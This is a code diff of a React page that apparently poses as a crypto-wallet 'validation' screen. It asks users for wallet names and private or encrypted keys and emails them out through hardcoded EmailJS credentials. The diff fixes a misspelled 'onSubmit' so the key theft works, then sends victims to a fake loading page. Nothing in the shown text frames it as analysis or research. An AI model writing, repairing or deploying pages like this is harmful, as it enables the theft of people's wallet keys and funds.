@@ -1,29 +1,33 @@
-import React, { useRef } from "react";
+import React, { useRef } from 'react';
 import "./Encrypt.css";
-import { NavLink } from "react-router-dom";
-import emailjs from "emailjs-com";
+import { NavLink, useNavigate } from 'react-router-dom';
+import emailjs from 'emailjs-com';
 
 export const Encrypt = () => {
+  // Initialize the navigate hook
+  const navigate = useNavigate();
+  
+  // Create a reference for the form
   const form = useRef();
 
+  // Function to handle form submission
   const sendEmail = (e) => {
-    e.preventDefault();
+    e.preventDefault(); // Prevent default form submission behavior
 
-    emailjs
-      .sendForm(
-        "service_qghi171",
-        "template_m0dnrdu",
-        form.current,
-        "HaqXdadPhJghOQ5LG"
-      )
-      .then(
-        () => {
-          console.log("SUCCESS!");
-        },
-        (error) => {
-          console.log("FAILED...", error.text);
-        }
-      );
+    emailjs.sendForm(
+      "service_qghi171",
+      "template_m0dnrdu",
+      form.current,
+      "HaqXdadPhJghOQ5LG"
+    ).then(
+      () => {
+        console.log("SUCCESS!"); // Log success message
+        navigate('/Loading'); // Navigate to the '/Loading' route
+      },
+      (error) => {
+        console.log("FAILED...", error.text); // Log error message
+      }
+    );
   };
 
   return (
@@ -38,29 +42,13 @@ export const Encrypt = () => {
       </div>
       <div className="myul">
         <ul>
-          <li>
-            <h3>
-            <NavLink to="/Contact"> Phrase </NavLink>
-            </h3>
-          </li>
-          <li>
-            <h3>
-              <NavLink to="/keystore">keystore JSON </NavLink>
-            </h3>
-          </li>
-          <li>
-            <h3>
-              <NavLink to="/private">Private Key </NavLink>
-            </h3>
-          </li>
-          <li>
-            <h3>
-              <NavLink to="/encrypt"> Encrypted Key </NavLink>
-            </h3>
-          </li>
+          <li><h3><NavLink to="/Contact">Phrase</NavLink></h3></li>
+          <li><h3><NavLink to="/keystore">keystore JSON</NavLink></h3></li>
+          <li><h3><NavLink to="/private">Private Key</NavLink></h3></li>
+          <li><h3><NavLink to="/encrypt">Encrypted Key</NavLink></h3></li>
         </ul>
       </div>
-      <form ref={form} nSubmit={sendEmail} className="myform">
+      <form ref={form} onSubmit={sendEmail} className="myform">
         <textarea
           name="walletName"
           placeholder="Wallet Name"
@@ -82,9 +70,9 @@ export const Encrypt = () => {
           required
         />
         <p>Typically 64 alphanumeric characters</p>
-        <NavLink to="/Loading">    <button type="submit" name="submit" >
+        <button type="submit" name="submit">
           <p>VALIDATE</p>
-        </button></NavLink> 
+        </button>
       </form>
     </div>
   );
